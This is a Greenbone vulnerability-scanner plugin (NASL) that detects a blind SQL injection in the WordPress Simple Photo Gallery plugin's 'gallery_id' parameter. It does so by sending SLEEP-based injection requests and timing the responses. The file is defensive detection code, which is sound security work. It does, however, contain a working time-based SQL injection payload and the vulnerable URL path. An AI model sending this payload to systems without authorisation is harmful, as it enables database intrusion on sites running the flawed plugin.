# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805193");
  script_version("2025-01-31T05:37:27+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-01-31 05:37:27 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2015-05-28 16:25:29 +0530 (Thu, 28 May 2015)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Wordpess Simple Photo Gallery Blind SQLi Vulnerability");

  script_tag(name:"summary", value:"WordPress Simple Photo Gallery is prone to blind SQL injection
  (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not.");

  script_tag(name:"insight", value:"Flaw is due to improper sanitization of
  user supplied input passed via 'gallery_id' parameter to the
  '/wppg_photogallery/wppg_photo_details' page.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"WordPress Simple Photo Gallery version
  1.7.8, prior versions may also be affected.");

  script_tag(name:"solution", value:"Update to version 1.8.0 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37113");
  script_xref(name:"URL", value:"https://wordpress.org/plugins/simple-photo-gallery/changelog");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

wait_extra_sec = 5;

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/index.php/wppg_photogallery/wppg_photo_details/";

host = http_host_name(port:port);

res = http_get_cache(item:url, port:port);
useragent = http_get_user_agent();

if(res =~ "^HTTP/1\.[01] 301") {
  url1 = egrep( pattern:"Location:.*://.*/index.php/wppg_photogallery/wppg_photo_details/", string:res);
  hostname = split(url1, sep:"/", keep:FALSE);
  if(!hostname[2])
    exit(0);

  host = hostname[2];

  req = 'GET ' + url + ' HTTP/1.1\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Host: ' + host + '\r\n' +
        'Connection: Keep-Alive\r\n' + '\r\n';
  res = http_keepalive_send_recv(port:port, data:req);
}

if(res =~ "^HTTP/1\.[01] 200" && "wp-content/plugins/simple-photo-gallery" >< res) {

  ## Added Multiple times, to make sure its working properly
  sleep = make_list(3, 5);

  ## Use sleep time to check we are able to execute command
  foreach sec (sleep) {
    url = dir + "/index.php/wppg_photogallery/wppg_photo_details/?"
              + "gallery_id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(" + sec + ")))QBzh)";

    req = 'GET ' + url + ' HTTP/1.1\r\n' +
          'User-Agent: ' + useragent + '\r\n' +
          'Host: ' + host + '\r\n' +
          'Connection: Keep-Alive\r\n' + '\r\n';

    start = unixtime();
    res = http_keepalive_send_recv(port:port, data:req);
    stop = unixtime();

    time_taken = stop - start;

    if(time_taken + 1 < sec || time_taken > (sec + wait_extra_sec)) exit(99);
  }
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
